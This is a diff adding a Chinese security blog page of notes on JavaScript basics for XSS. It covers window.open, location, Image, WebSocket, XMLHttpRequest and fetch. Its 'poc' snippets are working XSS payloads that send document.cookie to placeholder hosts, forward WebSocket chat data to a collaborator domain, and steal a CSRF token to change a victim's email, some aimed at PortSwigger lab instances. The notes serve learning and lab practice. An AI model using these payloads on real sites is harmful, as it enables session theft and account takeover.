@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf8" />
+    <meta name="viewport" content="initial-scale=1.0, width=device-width" />
+    <title>
+      
+        XSS相关js基础 | 东隅's blog
+      
+    </title>
+    <meta name="description" content=""/>
+    <meta name="keywords" content=""/>
+    
+      <link rel="apple-touch-icon"
+            sizes="180x180"
+            href="/images/jocker.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="32x32"
+            href="/images/jocker.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="16x16"
+            href="/images/jocker.png"/>
+    
+    
+      <link rel="mask-icon"
+            href="/images/jocker.png"
+            color=""/>
+    
+    
+    <link rel="stylesheet" type="text/css" href="/css/layout.css"/>
+    
+    
+  <link rel="stylesheet" type="text/css" href="/css/post.css"/>
+  
+
+  <meta name="generator" content="Hexo 5.4.0"></head>
+  <body>
+    <div class="head">
+      <div class="nav">
+        <a href="/" class="nav-logo">
+          <img alt="logo" height="60px" width="60px" src="/images/jocker.png" />
+        </a>
+        <input id="navBtn" type="checkbox"/>
+        <div class="nav-menu">
+          
+            
+              <a class="nav-menu-item" href="/%E5%AE%89%E5%85%A8">安全</a>
+            
+              <a class="nav-menu-item" href="/%E5%BC%80%E5%8F%91">开发</a>
+            
+              <a class="nav-menu-item" href="/%E7%94%9F%E6%B4%BB">生活</a>
+            
+          
+        </div>
+        <label class="nav-btn" for="navBtn"></label>
+      </div>
+    </div>
+    <div class="body">
+      
+  <article class="post-content">
+    <div class="post-inner">
+      <div class="post-content__head">
+        <div class="post-title">XSS相关js基础</div>
+        <div class="post-info">
+          
+  
+    <a href="/tags/OWASP/" class="post-tag">#OWASP</a>
+  
+    <a href="/tags/XSS/" class="post-tag">#XSS</a>
+  
+
+
+          <span class="post-date">2023-03-27</span>
+        </div>
+      </div>
+      <div id="postBody" class="post-content__body--toc">
+        <div id="tocAnchor" class="toc-anchor">
+          <ol id="toc" class="post-toc">
+            
+              <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8"><span class="toc-text">常用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WebSocket"><span class="toc-text">WebSocket</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XMLHttpRequest"><span class="toc-text">XMLHttpRequest</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#fetch"><span class="toc-text">fetch</span></a></li></ol>
+            
+          </ol>
+        </div>
+        
+          <div class="post-gallery">
+            
+          </div>
+        
+        <h1 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h1><blockquote>
+<p>以下方法都是通过document读cookie，设置了http-only的话就吃瘪了</p>
+</blockquote>
+<p>window.open</p>
+<p>open() 方法用于新打开一个新的浏览器窗口或查找一个已命名的窗口。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">window</span>.open(<span class="string">&quot;http://xxx/cookie.php?cookie=&quot;</span>+<span class="built_in">document</span>.cookie)&lt;/script&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.location=<span class="string">&quot;http://xxx/cookie.php?cookie=&quot;</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>document.location</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">document</span>.location=<span class="string">&quot;http://xxx/cookie.php?cookie=&quot;</span>+<span class="built_in">document</span>.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Image</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="keyword">new</span> Image().src=<span class="string">&quot;http://xxx/cookie.php?cookie=&quot;</span>+<span class="built_in">document</span>.cookie;&lt;script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="WebSocket"><a href="#WebSocket" class="headerlink" title="WebSocket"></a>WebSocket</h1><p><a target="_blank" rel="noopener" href="http://www.ruanyifeng.com/blog/2017/05/websocket.html">http://www.ruanyifeng.com/blog/2017/05/websocket.html</a></p>
+<blockquote>
+<p>初次接触 WebSocket 的人，都会问同样的问题：我们已经有了 HTTP 协议，为什么还需要另一个协议？它能带来什么好处？</p>
+<p>答案很简单，因为 HTTP 协议有一个缺陷：通信只能由客户端发起。HTTP 协议做不到服务器主动向客户端推送信息。</p>
+</blockquote>
+<p>它的最大特点就是，服务器可以主动向客户端推送信息，客户端也可以主动向服务器发送信息，是真正的双向平等对话</p>
+<img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305071200533.webp" alt="image-20230507120017566" style="zoom:67%;" />
+
+
+
+<p>ajax轮询</p>
+<blockquote>
+<p>http单向请求的特点，注定了如果服务器有连续的状态变化，客户端要获知就非常麻烦。我们只能使用<a target="_blank" rel="noopener" href="https://www.pubnub.com/blog/2014-12-01-http-long-polling/">“轮询”</a>：每隔一段时候，就发出一个询问，了解服务器有没有新的信息。最典型的场景就是聊天室。</p>
+<p>轮询的效率低，非常浪费资源（因为必须不停连接，或者 HTTP 连接始终打开）</p>
+</blockquote>
+<p>握手步骤图解，ajax轮询对比websocket</p>
+<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305071208509.webp" alt="image-20230507120807295"></p>
+<p>poc</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> ws = <span class="keyword">new</span> WebSocket(<span class="string">&#x27;wss://0a390011034ce37ac4128868009b005e.web-security-academy.net/chat&#x27;</span>);</span><br><span class="line">    ws.onopen = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        ws.send(<span class="string">&quot;READY&quot;</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">    ws.onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">        fetch(<span class="string">&#x27;https://bhwr3j502kct2ljwwrtofzi68xeo2d.oastify.com&#x27;</span>, &#123;<span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>, <span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span>, <span class="attr">body</span>: event.data&#125;);</span><br><span class="line">    &#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>步骤</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、新建 WebSocket 实例</span><br><span class="line"><span class="keyword">var</span> ws = <span class="keyword">new</span> WebSocket(<span class="string">&#x27;ws://localhost:8080&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、onopen属性，指定连接成功后的回调函数。</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、实例对象的onmessage属性，用于指定收到服务器数据后的回调函数。</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>、实例对象的onclose属性，用于指定连接关闭后的回调函数。</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>、实例对象的send()方法用于向服务器发送数据。</span><br><span class="line"></span><br><span class="line"><span class="number">6</span>、实例对象的onerror属性，用于指定报错时的回调函数。</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="XMLHttpRequest"><a href="#XMLHttpRequest" class="headerlink" title="XMLHttpRequest"></a>XMLHttpRequest</h1><blockquote>
+<p>在 <a target="_blank" rel="noopener" href="http://c.biancheng.net/js/">JavaScript</a> 中，XMLHttpRequest 是客户端的一个 API，它为浏览器与服务器通信提供了一个便捷通道。现代浏览器都支持 XMLHttpRequest API</p>
+</blockquote>
+<p>poc</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> req = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">req.onload = handleResponse;</span><br><span class="line">req.open(<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;/my-account&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line">req.send();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handleResponse</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> token = <span class="built_in">this</span>.responseText.match(<span class="regexp">/name=&quot;csrf&quot; value=&quot;(\w+)&quot;/</span>)[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">var</span> changeReq = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    changeReq.open(<span class="string">&#x27;post&#x27;</span>, <span class="string">&#x27;/my-account/change-email&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">    changeReq.send(<span class="string">&#x27;csrf=&#x27;</span>+token+<span class="string">&#x27;&amp;email=test@test.com&#x27;</span>)</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>步骤</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、创建 XMLHttpRequest 对象</span><br><span class="line">XMLHttpRequest 用于在后台与服务器交换数据。创建 XMLHttpRequest 对象的方法如下：</span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest ();</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、当接收到响应后，将调用此函数，不设置的话就是没有</span><br><span class="line">xhr.onload = <span class="function"><span class="keyword">function</span>；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">3、建立连接</span></span><br><span class="line"><span class="function">在 <span class="title">JavaScript</span> 中，使用 <span class="title">XMLHttpRequest</span> 对象的 <span class="title">open</span>(<span class="params"></span>) 方法可以建立一个 <span class="title">HTTP</span> 请求。用法如下：</span></span><br><span class="line"><span class="function"><span class="title">xhr</span>.<span class="title">open</span>(<span class="params">method, url, <span class="keyword">async</span>, username, password</span>)</span>;</span><br><span class="line">xhr 表示 XMLHttpRequest 对象，open() 方法包含 <span class="number">5</span> 个参数，说明如下：</span><br><span class="line">     method：HTTP 请求方法，必须参数，值包括 POST、GET 和 HEAD，大小写不敏感。</span><br><span class="line">     url：请求的 URL 字符串，必须参数，大部分浏览器仅支持同源请求。</span><br><span class="line">     <span class="keyword">async</span>：指定请求是否为异步方式，默认为 <span class="literal">true</span>。如果为 <span class="literal">false</span>，当状态改变时会立即调用 onreadystatechange 属性指定  的回调函数。</span><br><span class="line">     username：可选参数，如果服务器需要验证，该参数指定用户名，如果未指定，当服务器需要验证时，会弹出验证窗口。</span><br><span class="line">     password：可选参数，验证信息中的密码部分，如果用户名为空，则该值将被忽略。</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>、建立连接后，可以使用 send() 方法发送请求。用法如下：</span><br><span class="line">xhr.send(body);</span><br><span class="line">参数 body 表示将通过该请求发送的数据，如果不传递信息，可以设置为 <span class="literal">null</span> 或者省略。</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>、发送请求后，可以使用 XMLHttpRequest 对象的 responseBody、responseStream、responseText 或 responseXML 属等待接收响应数据。</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="fetch"><a href="#fetch" class="headerlink" title="fetch"></a>fetch</h1><p><code>fetch()</code>是 XMLHttpRequest 的升级版，用于在 JavaScript 脚本里面发出 HTTP 请求。</p>
+<p><a target="_blank" rel="noopener" href="https://ruanyifeng.com/blog/2020/12/fetch-tutorial.html">https://ruanyifeng.com/blog/2020/12/fetch-tutorial.html</a></p>
+<p>基本语法：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> promise = fetch(url, [options])</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong><code>url</code></strong> —— 要访问的 URL。</li>
+<li><strong><code>options</code></strong> —— 可选参数：method，header 等。</li>
+</ul>
+<p>没有 <code>options</code>，这就是一个简单的 GET 请求。</p>
+<p>poc</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">fetch(<span class="string">&#x27;https://BURP-COLLABORATOR-SUBDOMAIN&#x27;</span>, &#123;</span><br><span class="line"><span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line"><span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span>,</span><br><span class="line"><span class="attr">body</span>:<span class="built_in">document</span>.cookie</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+      </div>
+    </div>
+  </article>
+  <div class="post__foot">
+    
+    <div class="post-nav">
+  
+    <a class="post-nav-item-left" href="/2023/03/28/7.29/phpinfo/">
+      <div class="text-align">
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+        <span class="text-small">上一篇</span>
+      </div>
+      <div>phpinfo敏感信息</div>
+    </a>
+  
+  <div class="vhr"></div>
+  
+    <a class="post-nav-item-right" href="/2023/03/21/%E9%92%93cookie/">
+      <div class="text-align">
+        <span class="text-small">下一篇</span>
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             transform="scale(-1,-1)"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+      </div>
+      钓cookie
+    </a>
+  
+</div>
+
+    
+    
+  </div>
+
+    </div>
+    <div class="foot">
+      <div class="foot-inner">
+        <div class="foot__head">
+          
+            <div class="foot-line">
+              <div class="matts">安</div><div class="matts">得</div><div class="matts">倚</div><div class="matts">天</div><div class="matts">剑</div>
+            </div>
+          
+            <div class="foot-line">
+              <div class="matts">跨</div><div class="matts">海</div><div class="matts">斩</div><div class="matts">长</div><div class="matts">鲸</div>
+            </div>
+          
+        </div>
+        <div class="foot__body">
+          
+            <div class="foot-item">
+              <div class="foot-item__head">朋友</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link"
+                         height="20px"
+                         width="20px"
+                         src="/images/icon/icon-link.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://blog.huamang.xyz/">huamang</a>
+                  </div>
+                
+                  <div class="text">
+                    <img alt="link"
+                         height="20px"
+                         width="20px"
+                         src="/images/icon/icon-link.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://www.cnblogs.com/Aurora-M/">Aurora</a>
+                  </div>
+                
+                <div class="text">
+                  <img alt="link"
+                       height="20px"
+                       width="20px"
+                       src="/images/icon/icon-link+.svg"/>
+                  <a class="foot-link"
+                     href="mailto:735587142@qq.com?subject=%E7%94%B3%E8%AF%B7%20Hozen.site%20%E7%9A%84%E5%8F%8B%E9%93%BE%E4%BD%8D%E7%BD%AE">
+                  申请友链</a>
+                </div>
+              </div>
+            </div>
+          
+          
+            <div class="foot-item">
+              <div class="foot-item__head">账号</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-github.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/MUNG29">github</a>
+                  </div>
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/QQ.png"/>
+                    <a class="foot-link" href="">735587142</a>
+                  </div>
+                
+              </div>
+            </div>
+          
+          <div class="foot-item">
+            <div class="foot-item__head">联系</div>
+            <div class="foot-item__body">
+              <div class="text">
+                <img alt="link"
+                     height="20px"
+                     width="20px"
+                     src="/images/icon/icon-email.svg"/>
+                <a class="foot-link" href="mailto:735587142@qq.com">735587142@qq.com</a>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="copyright">
+          <a href="https://MUNG29.github.io">东隅's blog</a> &nbsp;|&nbsp;由&nbsp;<a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>&nbsp;及&nbsp;
+          <svg width="20" height="20" viewBox="0 0 725 725">
+            <path fill-rule="evenodd" fill="rgb(221, 221, 221)"
+            d="M145.870,236.632 L396.955,103.578 L431.292,419.44 L156.600,522.53 L145.870,236.632 Z" />
+            <path fill-rule="evenodd" fill="rgb(159, 159, 159)"
+            d="M396.955,103.578 L564.345,234.486 L611.558,513.469 L431.292,419.44 L396.955,103.578 Z" />
+            <path fill-rule="evenodd" fill="rgb(0, 0, 0)"
+            d="M431.292,419.44 L611.558,513.469 L358.327,595.18 L156.600,522.53 L431.292,419.44 Z" />
+          </svg>
+          <a target="_blank" rel="noopener" href="https://github.com/hooozen/hexo-theme-tranquility">致远</a>&nbsp;驱动
+        </div>
+      </div>
+    </div>
+    
+      <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+      <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+    
+    
+  
+  
+    <script type="text/javascript" src=/js/toc.js></script>
+  
+
+  </body>
+</html>
